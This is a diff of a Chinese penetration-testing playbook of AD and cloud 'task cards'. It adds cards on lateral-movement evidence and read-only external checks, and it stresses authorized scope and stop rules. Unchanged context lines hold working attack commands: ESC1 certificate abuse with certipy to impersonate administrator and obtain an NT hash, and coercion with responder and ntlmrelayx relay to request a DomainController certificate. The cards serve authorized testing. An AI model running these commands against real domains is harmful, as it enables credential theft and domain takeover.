@@ -1,6 +1,6 @@
-# ad-cloud 任务卡（24 张）
+# ad-cloud 任务卡（26 张）
 
-> 源：`Tool/config/taskcard-sources.json` 的 `ad-cloud` 键。每张卡六段；命令只在授权范围内执行。
+> 源：`Tool/config/taskcard-sources.json` 的 `ad-cloud` 键（24 张上游卡）+ 2 张本地硬化卡（25 横向移动 / 26 公网外部视角）。每张卡六段；命令只在授权范围内执行。
 > 统一红线：口令/hash/票据/证书私钥/AK-SK/token 只留指纹，不落明文；同账号认证失败 2 次即停。
 
 ### 01 BloodHound 采集与图谱复核（源：performing-active-directory-bloodhound-analysis）
@@ -34,10 +34,10 @@
 ### 04 ADCS ESC1 模板验证（源：exploiting-active-directory-certificate-services-esc1）
 - 触发词：ESC1、SAN、certipy req、certipy auth、证书模板
 - 前置：`certipy find -vulnerable` 有输出；当前账号对目标模板有 Enroll；授权允许申请测试证书
-- 步骤：1) `python Tool/skill/ad-cloud/scripts/ad-repro.py --help` → rc=0，期望：usage 含 `--input`/`--kind`；2) `python Tool/skill/ad-cloud/scripts/ad-repro.py --input Tool/cases/ad-cloud04/input/bundle.json --json` → rc=0，期望：results 中 `"kind": "adcs"` 且 `"verdict": "candidate"`；3) `python Tool/skill/ad-cloud/scripts/ad-repro.py --self-test` → rc=0，期望：`{"ok": true, "checks": 9, "kinds": 7}`
+- 步骤：1) `python Tool/skill/ad-cloud/scripts/ad-repro.py --help` → rc=0，期望：usage 含 `--input`/`--kind`；2) `python Tool/skill/ad-cloud/scripts/ad-repro.py --input Tool/cases/ad-cloud04/input/bundle.json --json` → rc=0，期望：results 中 `"kind": "adcs"` 且 `"verdict": "candidate"`；3) `python Tool/skill/ad-cloud/scripts/ad-repro.py --self-test` → rc=0，期望：`{"ok": true, "checks": 10, "kinds": 8}`
   1) `certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -vulnerable -stdout` → rc=0｜期望输出：目标模板段 `ESC1 : True`、`Enroll` 含当前账号、`Manager Approval : False`。
   2) `certipy req -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -ca '<CA>' -template '<Tpl>' -upn "administrator@$DOMAIN"` → rc=0｜期望输出：`Saved certificate and private key to 'administrator.pfx'`；rc=1（`CERTSRV_E_*`/`denied by policy`）=ESC1 不成立，停。
-  3) `python Tool/skill/ad-cloud/scripts/ad-repro.py --kind adcs --input find.json` → rc=0｜期望输出：`"verdict": "candidate"`（只拿到 pfx 就是 candidate，不是 confirmed）；rc=2 = 输入 schema 不对。
+  3) `python Tool/skill/ad-cloud/scripts/ad-repro.py --kind adcs --input Tool/cases/ad-cloud04/input/adcs-only.json` → rc=0｜期望输出：`"kind": "adcs"`、`"verdict": "candidate"`、`checks[0].check`=`esc-rule-hit`（只拿到 pfx 就是 candidate，不是 confirmed）；rc=2 = 输入 schema 不对。
   4) `certipy auth -pfx administrator.pfx -dc-ip "$DC"` → rc=0｜期望输出：`Got TGT` + `NT hash`；rc=1（`KDC_ERR_CLIENT_REVOKED`/`KDC_ERR_PADATA_TYPE_NOSUPP`）=证书不可认证。
 - 判据：pfx 的 EKU 含 Client Auth/Smart Card Logon，`certipy auth` 返回 TGT/ccache，且能访问一个只读目标
 - 失败判据：无 Enroll、需审批、CA 拒绝 SAN、auth 失败 → ESC1 不成立，转 ESC4/ESC5/ESC7，不反复 req
@@ -46,11 +46,11 @@
 ### 05 强制认证（PetitPotam/Coercer）前提核查（源：coercing-authentication-with-coercer-petitpotam）
 - 触发词：PetitPotam、Coercer、强制认证、MS-EFSRPC、relay
 - 前置：明确授权强制认证目标；有可用 relay/监听端；确认不会影响生产
-- 步骤：1) `python Tool/skill/ad-cloud/scripts/ad-repro.py --help` → rc=0，期望：usage 含 `--kind` 与 `adcs-esc`；2) `python Tool/skill/ad-cloud/scripts/ad-repro.py --kind adcs-esc --input Tool/cases/ad-cloud01/input/adcs-find.json` → rc=0，期望：`"esc_flags"` 含 `ESC11`/`ESC17` 且 `"verdict": "candidate"`；3) `python Tool/skill/ad-cloud/scripts/ad-repro.py --self-test` → rc=0，期望：`{"ok": true, "checks": 9, "kinds": 7}`
+- 步骤：1) `python Tool/skill/ad-cloud/scripts/ad-repro.py --help` → rc=0，期望：usage 含 `--kind` 与 `adcs-esc`；2) `python Tool/skill/ad-cloud/scripts/ad-repro.py --kind adcs-esc --input Tool/cases/ad-cloud01/input/adcs-find.json` → rc=0，期望：`"esc_flags"` 含 `ESC11`/`ESC17` 且 `"verdict": "candidate"`；3) `python Tool/skill/ad-cloud/scripts/ad-repro.py --self-test` → rc=0，期望：`{"ok": true, "checks": 10, "kinds": 8}`
   1) `nxc smb <target> -u '' -p '' -M coerce_plus -o LISTENER=<LISTENER_IP>` → rc=0｜期望输出：`Coerce+ ... EFSRPC/DFSCoerce` 命中；`STATUS_ACCESS_DENIED`=接口已补，停。
   2) `sudo responder -I eth0 -A`（或专用监听端）→ rc=0｜期望输出：`[SMB] NTLMv2-SSP Client : <target_ip>`，记时间与来源。
   3) `impacket-ntlmrelayx -t 'http://<CA_HOST>/certsrv/certfnsh.asp' -smb2support --adcs --template 'DomainController'` → rc=0｜期望输出：`GOT CERTIFICATE!` + `Writing PKCS#12 certificate`。
-  4) 组合 ESC8/ESC11/ESC17 前先跑 `python Tool/skill/ad-cloud/scripts/ad-repro.py --kind adcs-esc --input find.json` → rc=0｜期望输出：`"esc_flags"` 含目标 ESC 且 `"verdict"` 非 blocked；rc=2 = 缺配置位，不许猜。
+  4) 组合 ESC8/ESC11/ESC17 前先跑 `python Tool/skill/ad-cloud/scripts/ad-repro.py --kind adcs-esc --input Tool/cases/ad-cloud01/input/adcs-find.json` → rc=0｜期望输出：`"esc_flags"` 含目标 ESC 且 `"verdict"` 非 blocked；rc=2 = 缺配置位，不许猜。
 - 判据：监听端收到目标机器账号认证（含来源 IP/时间），且未造成业务中断；认证可被 relay 到授权端点
 - 失败判据：目标已打补丁/接口关闭、监听收不到、强制认证触发业务告警 → 立即停，转凭据直连/其他面
 - reference：Tool/skill/ad-cloud/references/ad-attacks.md
@@ -74,8 +74,11 @@
 ### 08 DCSync 检测与只读复核（源：detecting-dcsync-attack-in-active-directory）
 - 触发词：DCSync、DRSUAPI、4769、DS-Replication-Get-Changes、域控同步
 - 前置：有 DC Security 日志或 EDR 遥测；授权允许读日志；不执行真实 DCSync
-- 步骤：1) 查 4662（对象复制）与 4769（目标服务 krbtgt/DC）时间线；2) 对照复制权限（DS-Replication-Get-Changes/All）与账号；3) 用只读 LDAP 核对账号组成员与 ACL
-- 判据：4662 的对象 GUID 指向域命名上下文、账号具备复制权限、时间线与 4769 对齐；三条同时成立才是强证据
+- 步骤：（剧本：命令 → 退出码 → 期望输出；rc≠0 即停）
+  1) `python Tool/skill/ad-cloud/scripts/ad-repro.py --kind windows-events --input Tool/cases/ad-cloud03/input/security-events.json --json` → rc=0｜期望输出：`"verdict": "blocked"`、`summary.kerberos_events`=0、`summary.counts."4624"`=50、`summary.record_id_gaps`=[]
+  2) `python Tool/skill/ad-cloud/scripts/ad-repro.py --self-test` → rc=0｜期望输出：`{"ok": true, "checks": 10, "kinds": 8}`
+  3) `python Tool/skill/ad-cloud/scripts/ad-repro.py --help` → rc=0｜期望输出：usage 含 `windows-events` 与 `ntlm-type2`
+- 判据：4662 的对象 GUID 指向域命名上下文、账号具备复制权限、时间线与 4769 对齐；三条同时成立才是强证据（脚本只做离线复算，4662/4769 仍需 DC Security 日志）
 - 失败判据：只有单条 4662、账号无复制权限、日志缺口/转发 → 不能写 DCSync，降级为 candidate 并补遥测
 - reference：Tool/skill/ad-cloud/references/05-delegation-and-rbcd.md
 
@@ -122,16 +125,22 @@
 ### 14 AWS IAM 提权检测规则（源：detecting-aws-iam-privilege-escalation）
 - 触发词：IAM 提权检测、CloudTrail、CreatePolicyVersion、PassRole、AssumeRole
 - 前置：有 CloudTrail/GuardDuty 或策略 JSON；授权允许读日志/策略
-- 步骤：1) 查高风险 API（CreatePolicyVersion/AttachUserPolicy/PassRole/CreateAccessKey）时间线；2) 对照调用者身份与策略变更前后版本；3) 用 `cloud-iam-eval.py` 复算“文本是否允许”，再与日志对齐
-- 判据：高风险 API 调用者、时间、策略版本、资源四者对齐；变更有实际权限提升证据
+- 步骤：（剧本：命令 → 退出码 → 期望输出；rc≠0 即停）
+  1) `python Tool/skill/ad-cloud/scripts/cloud-iam-eval.py --input Tool/cases/ad-cloud05/input/policy.json --action iam:CreatePolicyVersion --resource '*' --json` → rc=0｜期望输出：`"decision": "allow"`、`"privesc"[0].severity`=`"critical"`、`"matched"[0].policy`=`"CiRunnerInline"`
+  2) `python Tool/skill/ad-cloud/scripts/cloud-iam-eval.py --input Tool/cases/ad-cloud05/input/policy.json --action s3:GetObject --resource 'arn:aws:s3:::demo-bucket/secret/x' --json` → rc=0｜期望输出：`"decision": "deny"` 且 `deny_statements` 非空
+  3) `python Tool/skill/ad-cloud/scripts/cloud-iam-eval.py --self-test` → rc=0｜期望输出：`"ok": true`
+- 判据：高风险 API 调用者、时间、策略版本、资源四者对齐；变更有实际权限提升证据（脚本只算“文本 allow”，仍需 CloudTrail 对齐）
 - 失败判据：只有单条 API 无策略变更、日志缺口、调用者是合法自动化 → 误报，降级并补上下文
 - reference：Tool/skill/ad-cloud/references/cloud-native.md
 
 ### 15 收敛 AWS IAM 权限的验证（源：securing-aws-iam-permissions）
 - 触发词：IAM 收敛、least privilege、boundary、SCP、修复验证
 - 前置：有策略修改授权；已备份原策略；有回滚计划
-- 步骤：1) 记录修改前 policy version/attachment；2) 应用最小权限/boundary/SCP；3) 用只读 API 与 `cloud-iam-eval.py` 验证目标动作仍可用、越权动作被拒
-- 判据：修复后目标业务动作成功、越权动作 deny、回滚路径可用；记录版本与时间
+- 步骤：（剧本：命令 → 退出码 → 期望输出；rc≠0 即停）
+  1) `python Tool/skill/ad-cloud/scripts/cloud-iam-eval.py --input Tool/cases/ad-cloud05/input/policy.json --action s3:GetObject --resource 'arn:aws:s3:::demo-bucket/ci/report.json' --json` → rc=0｜期望输出：`"decision": "allow"`、`deny_statements` 为空（业务路径保留）
+  2) `python Tool/skill/ad-cloud/scripts/cloud-iam-eval.py --input Tool/cases/ad-cloud05/input/policy.json --action s3:GetObject --resource 'arn:aws:s3:::demo-bucket/secret/x' --json` → rc=0｜期望输出：`"decision": "deny"`、`deny_statements` 非空（越权路径被拦）
+  3) `python Tool/skill/ad-cloud/scripts/cloud-iam-eval.py --self-test` → rc=0｜期望输出：`"ok": true`
+- 判据：修复后目标业务动作成功、越权动作 deny、回滚路径可用；记录版本与时间（用 allow/deny 两个请求做最小回归）
 - 失败判据：业务中断、boundary 误伤、无法回滚 → 立即回滚并上报，不继续收窄
 - reference：Tool/skill/ad-cloud/references/02-failure-criteria.md
 
@@ -173,9 +182,9 @@
 ### 20 K8s RBAC 提权审计（源：auditing-kubernetes-rbac-privilege-escalation）
 - 触发词：RBAC、ClusterRole、RoleBinding、wildcard、escalate、bind
 - 前置：有只读 RBAC 权限；授权允许读 role/clusterrole/binding
-- 步骤：1) `python Tool/skill/ad-cloud/scripts/ad-repro.py --input Tool/cases/ad-cloud04/input/bundle.json --json` → rc=0，期望：results 含 `"kind": "k8s-rbac"` 且 `"verdict": "candidate"`；2) `python Tool/skill/ad-cloud/scripts/ad-repro.py --self-test` → rc=0，期望：`"kinds": 7`；3) `python Tool/scripts/adcloud-check.py --self-test` → rc=0，期望：`"ok": true`
+- 步骤：1) `python Tool/skill/ad-cloud/scripts/ad-repro.py --input Tool/cases/ad-cloud04/input/bundle.json --json` → rc=0，期望：results 含 `"kind": "k8s-rbac"` 且 `"verdict": "candidate"`；2) `python Tool/skill/ad-cloud/scripts/ad-repro.py --self-test` → rc=0，期望：`"kinds": 8`；3) `python Tool/scripts/adcloud-check.py --self-test` → rc=0，期望：`"ok": true`
   1) `kubectl get clusterrolebinding,rolebinding -A -o json > rbac.json` → rc=0｜期望输出：`items` ≥ 1 且 subject 含当前 SA/用户；空 `items` = 无可审面。
-  2) 把绑定与当前身份整理成 `{"kind":"k8s-rbac","can_i":[...]}` 后跑 `python Tool/skill/ad-cloud/scripts/ad-repro.py --kind k8s-rbac --input rbac-eval.json` → rc=0｜期望输出：`"verdict"` ∈ {candidate, confirmed} 且 `checks[].ok` 与 `auth can-i` 一致；rc=2 → 打印 `{"ok": false, "blocked_at": ...}`，先修输入。
+  2) 把绑定与当前身份整理成 `{"kind":"k8s-rbac","can_i":[...]}` 后跑 `python Tool/skill/ad-cloud/scripts/ad-repro.py --kind k8s-rbac --input Tool/cases/ad-cloud04/input/k8s-rbac-only.json` → rc=0｜期望输出：`"verdict": "candidate"`、`allowed_count`=2；自建输入时 `checks[].ok` 必须与 `auth can-i` 一致；rc=2 → 打印 `{"ok": false, "blocked_at": ...}`，先修输入。
   3) `kubectl auth can-i create pods --as=system:serviceaccount:<ns>:<sa>` → rc=0｜期望输出：`yes` 才算路径成立；`no` = blocked，转 Secret/CI。
 - 判据：绑定 subject 与当前身份匹配、规则确实允许目标 verb/resource、只读验证成功
 - 失败判据：名称像高权但绑定窄、规则被 admission 限制、auth can-i 为 no → candidate/blocked，转 Secret/CI
@@ -212,3 +221,25 @@
 - 判据：FAIL 项有配置文件/进程参数证据；能映射到具体风险与修复；不把 FAIL 直接写成提权
 - 失败判据：版本不匹配、权限不足、FAIL 项被托管服务覆盖 → 标 unknown/未覆盖，不硬套 CIS
 - reference：Tool/skill/ad-cloud/references/k8s-and-container.md
+
+### 25 横向移动路径选择与目标侧证据（源：本地硬化）
+- 触发词：横向移动、PtH、WMI、WinRM、schtasks、DCOM、RBCD、4624 类型 3、4688
+- 前置：已有口令/hash/票据或 relay 入站认证；授权清单含源主机、目标主机、目标账号；写操作（建服务/计划任务/RBCD）单独授权
+- 步骤：（剧本：命令 → 退出码 → 期望输出；rc≠0 即停）
+  1) `python Tool/skill/ad-cloud/scripts/ad-repro.py --input Tool/cases/ad-cloud04/input/bundle.json --json` → rc=0｜期望输出：`results` 5 条且 `"summary": {"candidate": 5}`；`kind=delegation` 的 `accounts[0].ticket_obtained`=false、`paths` 含 `unconstrained`（有委派属性但无票据 → 只能写 candidate）
+  2) `python Tool/skill/ad-cloud/scripts/ad-repro.py --kind windows-events --input Tool/cases/ad-cloud03/input/security-events.json --json` → rc=0｜期望输出：`"verdict": "blocked"`、`summary.counts."4624"`=50、`summary.kerberos_events`=0（单机无域事件 → 不能证明横向成功）
+  3) `python Tool/skill/ad-cloud/scripts/ad-repro.py --self-test` → rc=0｜期望输出：`{"ok": true, "checks": 10, "kinds": 8}`
+- 判据：目标侧出现预期身份的 4688（父进程 WmiPrvSE.exe/mmc.exe/services.exe）、7045、4698 或命令回显，且与 4624 类型 3 的账号/来源/时间对齐；relay 额外要目标 4624+4776；只认证成功/ReturnValue=0 不算
+- 失败判据：目标无 4688/7045/4698/回显、认证 SUCCEED 无会话、Access denied/0x80070005、SMB/LDAP signing 强制 → 当前手法 blocked，按 `06-lateral-movement.md` 的四列换面，不重复 relay
+- reference：Tool/skill/ad-cloud/references/06-lateral-movement.md
+
+### 26 公网 445/389/88 外部视角只读核查（源：本地硬化）
+- 触发词：公网、445、389、88、NTLM type 2、LDAP 匿名、Kerberos 用户名枚举、只读
+- 前置：授权清单只有 IP/域名；允许只读协商/绑定/AS-REQ；书面禁止爆破、写、投毒（LLMNR/NBT-NS/WPAD/伪造 DC/票据注入）
+- 步骤：（剧本：命令 → 退出码 → 期望输出；rc≠0 即停）
+  1) `python Tool/skill/ad-cloud/scripts/ad-repro.py --kind ntlm-type2 --input Tool/cases/ad-cloud01/input/ntlm-type2.json --json` → rc=0｜期望输出：`"verdict": "candidate"`、`"dns_domain": "corp.local"`、`"os_version": "10.0.20348"`、`"timestamp": "2026-10-21T14:00:00Z"`、`"auth_attempted": false`（只解析，不发认证）
+  2) `python Tool/skill/ad-cloud/scripts/ad-repro.py --self-test` → rc=0｜期望输出：`{"ok": true, "checks": 10, "kinds": 8}`
+  3) `python Tool/skill/ad-cloud/scripts/ad-repro.py --help` → rc=0｜期望输出：usage 含 `ntlm-type2` 与 `--kind`
+- 判据：type 2 能解析出域/OS/时间戳只到 candidate；LDAP rootDSE resultCode=0 只到 candidate；KDC 错误码 6/25/AS-REP 可分类；challenge 只留指纹；全程未爆破、未写、未投毒
+- 失败判据：只有端口开放无协议响应、type 2 解析失败、LDAP 匿名 49/8、KDC 只回 25、时差 >5 分钟 → 记 blocked/unknown，不得用口令字典或写入把“只读枚举”升级成验证
+- reference：Tool/skill/ad-cloud/references/ad-attacks.md
